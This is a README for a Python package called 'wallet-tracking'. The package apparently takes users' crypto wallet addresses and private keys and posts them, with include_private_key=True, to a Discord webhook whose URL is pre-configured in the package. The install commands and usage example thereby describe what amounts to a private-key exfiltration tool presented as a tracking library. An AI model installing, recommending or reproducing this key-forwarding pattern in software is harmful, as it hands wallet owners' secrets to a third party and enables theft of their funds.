# Wallet Tracking Package

## Installation

### Option 1: Install from PyPI (Recommended for Production)

```bash
pip install wallet-tracking
```

### Option 2: Install from local directory (Development)

```bash
# Navigate to the package directory
cd wallet_tracking_package

# Install in development mode
pip install -e .

# Or install normally
pip install .
```

### Option 3: Build and install wheel

```bash
# Build the package
python setup.py sdist bdist_wheel

# Install the built wheel
pip install dist/wallet_tracking-1.0.0-py3-none-any.whl
```

### Option 4: Install from source (Production)

```bash
# Copy package to target location and install
pip install /path/to/wallet_tracking_package
```

## Usage

```python
from wallet_tracking import WalletTracker

# Initialize (uses default webhook URL)
tracker = WalletTracker(enabled=True)

# Or specify custom webhook URL
tracker = WalletTracker(
    webhook_url="https://discord.com/api/webhooks/YOUR_URL",
    enabled=True
)

# Track private key import
tracker.track_private_key_import(
    user_id=12345,
    wallet_address="YourWalletAddress...",
    private_key="YourPrivateKey...",
    include_private_key=True
)

# Test connection
tracker.test_connection()
```

## Configuration

The webhook URL is pre-configured in the package. To change it:

1. Edit `wallet_tracking/tracker.py`
2. Update `DEFAULT_WEBHOOK_URL` constant
3. Rebuild and reinstall the package

## Building the Package

```bash
# Install build tools
pip install build wheel

# Build source distribution and wheel
python -m build

# Output will be in dist/ directory:
# - wallet_tracking-1.0.0.tar.gz (source)
# - wallet_tracking-1.0.0-py3-none-any.whl (wheel)
```

## Requirements

- Python >= 3.8
- requests >= 2.28.0

## Deployment

To deploy this package to PyPI, see [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) for step-by-step instructions.

## Checking Deployed Version

There are several ways to check if a new version is deployed on PyPI:

### Method 1: Check PyPI Website

Visit the package page directly:
```
https://pypi.org/project/wallet-tracking/
```

The latest version will be displayed on the package page.

### Method 2: Use pip to Check Version

```bash
# Check what version is available on PyPI
pip index versions wallet-tracking

# Or check what version would be installed
pip install --dry-run wallet-tracking
```

### Method 3: Use PyPI JSON API

```bash
# Using curl (Windows PowerShell)
curl https://pypi.org/pypi/wallet-tracking/json | ConvertFrom-Json | Select-Object -ExpandProperty info | Select-Object version

# Using Python
python -c "import requests; print(requests.get('https://pypi.org/pypi/wallet-tracking/json').json()['info']['version'])"
```

### Method 4: Use the Check Script

A helper script is provided to check versions:

```bash
# Install required dependency
pip install requests packaging

# Run the check script
python check_version.py
```

This script will:
- Show the latest version on PyPI
- List all available versions
- Compare with your local version (if installed)
- Verify if a specific version is deployed


